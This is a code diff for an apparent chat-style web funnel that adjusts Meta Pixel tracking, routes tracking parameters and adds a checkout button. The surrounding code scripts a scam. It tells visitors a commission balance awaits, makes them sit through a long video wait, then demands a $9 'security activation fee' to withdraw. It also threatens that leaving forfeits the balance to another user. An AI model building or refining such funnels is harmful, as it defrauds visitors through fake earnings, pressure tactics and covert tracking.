@@ -10,20 +10,7 @@
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <!-- Meta Pixel -->
-  <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1420189650232210');
-    (function(){try{var k='fb_pv_'+location.pathname;if(sessionStorage.getItem(k))return;sessionStorage.setItem(k,'1');var n=0;var t=setInterval(function(){n++;if(window.fbq&&fbq.loaded){clearInterval(t);fbq('track','PageView');}else if(n>80){clearInterval(t);if(window.fbq)fbq('track','PageView');}},250);}catch(e){if(window.fbq)fbq('track','PageView');}})();
-  </script>
-  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1420189650232210&ev=PageView&noscript=1" /></noscript>
+  <script src="/sp/meta-pixel.js"></script>
   <script src="https://click-charm-73.lovable.app/funnel.js?w=976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd&f=9af23cbc-93d1-4812-9666-84637488d471" data-auto="true" defer></script>
   <script>
     var s = document.createElement("script");
@@ -585,9 +572,9 @@
 
       var all = stored();
       // parent page (this chat runs inside an iframe on "/")
-      try { if (window.top !== window.self) fromSearch(window.top.location.search, all); } catch (e) {}
+      try { if (window.top !== window.self) fromSearch((window.top.spTrackingSearch || window.top.location.search), all); } catch (e) {}
       try { if (document.referrer) fromSearch(new URL(document.referrer).search, all); } catch (e) {}
-      fromSearch(window.location.search, all);
+      fromSearch((window.spTrackingSearch || window.location.search), all);
 
       try { localStorage.setItem(KEY, JSON.stringify({ t: Date.now(), p: all })); } catch (e) {}
 
@@ -807,7 +794,7 @@
         f.src = 'about:blank';
         f.onload = function () {
           f.onload = null;
-          f.src = url + (location.search || '?') + '&vl=' + encodeURIComponent(location.href);
+          f.src = url + ((window.spTrackingSearch || location.search) || '?') + '&vl=' + encodeURIComponent(location.href);
         };
         f.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:0';
         w.appendChild(f);
@@ -818,12 +805,13 @@
 
       function clearInput() { input.innerHTML = ''; }
 
-      function askButton(label) {
+      function askButton(label, checkout) {
         return new Promise(function (resolve) {
           clearInput();
           var b = document.createElement('button');
           b.className = 'cta';
           b.textContent = label;
+          if (checkout) b.setAttribute('data-meta-checkout', '');
           b.onclick = function () {
             clearInput();
             userRow(label);
@@ -979,7 +967,7 @@
         await sayStatus('Your access to withdraw your commission will be granted after this short explanatory video', 'alert');
         player('https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/6a9b6338436465858b454fd7/v4/embed.html', 56.25);
         var __h = location.hostname;
-        var __isDev = __h === 'localhost' || __h === '127.0.0.1' || __h.indexOf('id-preview--') === 0 || __h.indexOf('-dev.lovable.app') > -1 || __h.indexOf('.lovableproject.com') > -1 || __h.indexOf('.sandbox.lovable.dev') > -1 || new URLSearchParams(location.search).get('dev') === '1';
+        var __isDev = __h === 'localhost' || __h === '127.0.0.1' || __h.indexOf('id-preview--') === 0 || __h.indexOf('-dev.lovable.app') > -1 || __h.indexOf('.lovableproject.com') > -1 || __h.indexOf('.sandbox.lovable.dev') > -1 || new URLSearchParams((window.spTrackingSearch || location.search)).get('dev') === '1';
         await sleep(__isDev ? 0 : 260000);
         await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
         await sleep(5000);
@@ -987,8 +975,8 @@
         await sleep(4000);
         await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
         await sleep(3000);
-        await say("We'll redirect you to the payment page—please don't leave the payment page.");
-        await sleep(4000);
+        await say('Continue to the payment page using the button below.');
+        await askButton('Continue to checkout', true);
         step('checkoutspt');
         step('checkout');
         var checkoutUrl = window.spUrlWith(CHECKOUT, {
